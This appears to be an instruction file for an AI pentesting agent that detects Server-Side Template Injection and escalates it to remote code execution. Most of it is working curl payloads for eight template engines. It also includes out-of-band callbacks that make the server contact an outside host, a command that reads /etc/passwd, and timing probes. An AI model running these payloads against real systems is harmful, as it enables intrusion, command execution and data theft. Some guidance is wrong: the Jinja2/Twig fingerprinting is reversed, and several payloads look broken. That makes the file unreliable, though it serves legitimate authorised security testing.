---
name: blackbox-ssti
description: >-
  Actively test a target web application for Server-Side Template Injection
  (SSTI) vulnerabilities using blackbox techniques. Reads pentest/target-map.md,
  injects polyglot template probes into all string parameters, identifies the
  template engine from math expression evaluation, escalates to RCE using
  engine-specific payloads (Jinja2, Twig, Freemarker, Pebble, Velocity, Jade,
  ERB, Mako, Smarty), and writes confirmed findings with PoC curl commands to
  pentest/ssti-results.md. Use when asked to find SSTI or template injection in
  a blackbox pentest.
---

# Blackbox SSTI Detection

You are actively testing a web application for Server-Side Template Injection without source code access. SSTI occurs when user input is rendered directly by a template engine, allowing expression evaluation and potentially full RCE.

**Prerequisite**: Read `pentest/target-map.md` before starting.

---

## SSTI Detection Decision Tree

```
Inject: {{7*7}}
├── Response contains 49 → Jinja2 or Twig
│   ├── Inject {{7*'7'}}
│   │   ├── Returns 49 → Jinja2 (Python)
│   │   └── Returns 7777777 → Twig (PHP)
└── Response unchanged (literal {{7*7}})
    ├── Inject ${7*7}
    │   ├── Returns 49 → FreeMarker, Pebble, or Spring EL
    │   └── Not evaluated → try next
    ├── Inject #{7*7}  
    │   ├── Returns 49 → Ruby (ERB/Slim)
    └── Inject <%= 7*7 %>
        └── Returns 49 → ERB (Ruby)
```

---

## Phase 1: Identify SSTI Candidates

Read `pentest/target-map.md` and find string parameters that may be rendered by a template engine:

- **High priority**: `name`, `message`, `subject`, `template`, `greeting`, `body`, `content`, `title`, `text`, `preview`, `format`, `label`, `description`
- **Feature hints**: Email preview editors, notification message customization, PDF report titles, custom landing pages, error page customization, webhook body templates

Write candidates to `pentest/ssti-recon.md`.

---

## Phase 2: Polyglot SSTI Probe

Start with a polyglot probe that triggers across multiple engines:

```bash
# Polyglot: will trigger Jinja2, Twig, FreeMarker, Pebble, Velocity
PROBE='{{7*7}}${7*7}#{7*7}<%=7*7%>'
curl -sk "<TARGET_URL>/greet?name=$PROBE"
curl -sk "<TARGET_URL>/preview?template=$PROBE"
curl -sk "<TARGET_URL>/notify?message=$PROBE"

# If response contains "49" → SSTI detected
```

If 49 appears, narrow down the engine with targeted tests below.

---

## Phase 3: Engine Identification & RCE

### 3.1 Jinja2 (Python/Flask/Django)

**Detection**:
```bash
curl -sk "<TARGET_URL>/greet?name={{7*'7'}}"
# → 49 (Jinja2 evaluates 7*'7' as 49 via integer coercion)
```

**RCE Payloads**:
```bash
# Method 1: via __class__
curl -sk "<TARGET_URL>/greet?name={{''.__class__.__mro__[1].__subclasses__()}}"
# Find subprocess.Popen index, then:
curl -sk "<TARGET_URL>/greet?name={{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0]}}"

# Method 2: via config (Flask debug)
curl -sk "<TARGET_URL>/greet?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"

# Method 3: simpler (if builtins accessible)
curl -sk "<TARGET_URL>/greet?name={% import os %}{{os.popen('id').read()}}"

# Method 4: lipsum/cycler/joiner globals
curl -sk "<TARGET_URL>/greet?name={{lipsum.__globals__.os.popen('id').read()}}"

# Method 5: request.application (Flask)
curl -sk "<TARGET_URL>/greet?name={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
```

### 3.2 Twig (PHP/Symfony/Drupal)

**Detection**:
```bash
curl -sk "<TARGET_URL>/template?msg={{7*'7'}}"
# → 7777777 (Twig concatenates string)
```

**RCE Payloads**:
```bash
# Method 1: _self.env filter callback
curl -sk "<TARGET_URL>/template?msg={{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"

# Method 2: filter chain
curl -sk "<TARGET_URL>/template?msg=\${{'id'|filter('system')}}"

# Method 3: Twig v2+ 
curl -sk "<TARGET_URL>/template?msg={{[0]|map('system','id')|join}}"
```

### 3.3 FreeMarker (Java)

**Detection**:
```bash
curl -sk "<TARGET_URL>/notify?msg=\${7*7}"
# → 49
```

**RCE Payloads**:
```bash
# Method 1: Execute class
curl -sk "<TARGET_URL>/notify?msg=<#assign+ex='freemarker.template.utility.Execute'?new()>\${ex('id')}"

# Method 2: ObjectConstructor
curl -sk "<TARGET_URL>/notify?msg=<#assign+ob='freemarker.template.utility.ObjectConstructor'?new()>\${ob('java.lang.ProcessBuilder','id').start()}"
```

### 3.4 Pebble (Java)

**Detection**:
```bash
curl -sk "<TARGET_URL>/msg?\${7*7}"
# → 49
```

**RCE**:
```bash
curl -sk "<TARGET_URL>/msg?t={%+set+cmd+'='+'id'%}{%+set+beans+=+beans|toJson+%}"
```

### 3.5 Velocity (Java)

**Detection**:
```bash
curl -sk "<TARGET_URL>/template?body=#set(\$x=7*7)\${x}"
# → 49
```

**RCE**:
```bash
curl -sk "<TARGET_URL>/template?body=#set(\$s='')\#set(\$stringClass=\$s.class.forName('java.lang.Runtime'))\#set(\$runtime=\$stringClass.getMethod('getRuntime').invoke(\$stringClass))\#set(\$process=\$runtime.exec('id'))\#set(\$inputStream=\$process.getInputStream())\#set(\$reader=\$s.class.forName('java.io.InputStreamReader').getConstructor(\$inputStream.class).newInstance(\$inputStream))\#set(\$br=\$s.class.forName('java.io.BufferedReader').getConstructor(\$reader.class).newInstance(\$reader))\${br.readLine()}"
```

### 3.6 ERB (Ruby on Rails)

**Detection**:
```bash
curl -sk "<TARGET_URL>/render?view=<%=7*7%>"
# → 49
```

**RCE**:
```bash
# backtick execution
curl -sk "<TARGET_URL>/render?view=<%=%60id%60%25>"
# system() call
curl -sk "<TARGET_URL>/render?view=<%=system('id')%>"
```

### 3.7 Mako (Python)

**Detection**:
```bash
curl -sk "<TARGET_URL>/page?t=\${7*7}"
# → 49
```

**RCE**:
```bash
curl -sk "<TARGET_URL>/page?t=\${__import__('os').popen('id').read()}"
```

### 3.8 Smarty (PHP)

**Detection**:
```bash
curl -sk "<TARGET_URL>/email?body={7*7}"
# → 49
```

**RCE**:
```bash
curl -sk "<TARGET_URL>/email?body={system('id')}"
curl -sk "<TARGET_URL>/email?body={php}echo+system('id');{/php}"
```

---

## Phase 4: Blind SSTI (No Output Reflection)

If the expression result is not returned in the response, use OOB or time-based detection:

```bash
OOB="http://abc123.oast.me"

# Jinja2 blind detection (make HTTP request)
curl -sk "<TARGET_URL>/notify" \
  -d "message={{config.__class__.__init__.__globals__['os'].popen('curl $OOB').read()}}"

# FreeMarker blind
curl -sk "<TARGET_URL>/email" \
  -d "subject=<#assign ex='freemarker.template.utility.Execute'?new()>\${ex('curl $OOB')}"

# Time-based: inject sleep
curl -sk "<TARGET_URL>/preview?msg={{''.__class__.__mro__[1].__subclasses__()[396]('sleep 5',shell=True).wait()}}" \
  -w "\nTime: %{time_total}s\n"
```

---

## Output Format

Write findings to `pentest/ssti-results.md`:

```markdown
# SSTI Assessment Results

## Executive Summary
- Parameters tested: [N]
- Confirmed SSTI: [N]
- Confirmed SSTI→RCE: [N]
- Not Vulnerable: [N]

## Findings

### [CONFIRMED SSTI → RCE] /greet?name= — Jinja2 (Python)

- **Endpoint**: `GET /greet?name=<payload>`
- **Parameter**: `name` (query string)
- **Template Engine**: Jinja2 (Python/Flask)
- **Impact**: CRITICAL — Full RCE; attacker can execute arbitrary Python code as the application user
- **Detection Evidence**: `{{7*7}}` returns `49`; `{{7*'7'}}` returns `49` (confirming Jinja2)
- **PoC**:
  ```bash
  # 1. Detect SSTI
  curl -sk "https://target.com/greet?name={{7*7}}"
  # Expected: Response contains "49"

  # 2. Fingerprint engine
  curl -sk "https://target.com/greet?name={{7*'7'}}"
  # Expected: "49" → Jinja2 confirmed

  # 3. Execute id command
  curl -sk "https://target.com/greet?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
  # Expected: uid=33(www-data) gid=33(www-data)

  # 4. Read sensitive files
  curl -sk "https://target.com/greet?name={{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}"
  ```
- **Remediation**: Never pass user input as a template string. Use `render_template_string` with user data as variables, not as the template itself: `render_template_string("Hello {{ name }}", name=user_input)`.
```

After writing results, delete `pentest/ssti-recon.md`.

---

## Important Reminders

- Always start with the safe math probe (`{{7*7}}`) — it's non-destructive and definitive.
- The polyglot probe `{{7*7}}${7*7}#{7*7}<%=7*7%>` is your quickest detector across all engines.
- Sandbox escapes for Jinja2 evolve frequently — the subclasses index (396) may differ; enumerate with `.__subclasses__()` to find `subprocess.Popen`.
- For RCE PoC, use `id` and `whoami` only — never destructive commands.
- Clean up: delete `pentest/ssti-recon.md` after writing results.
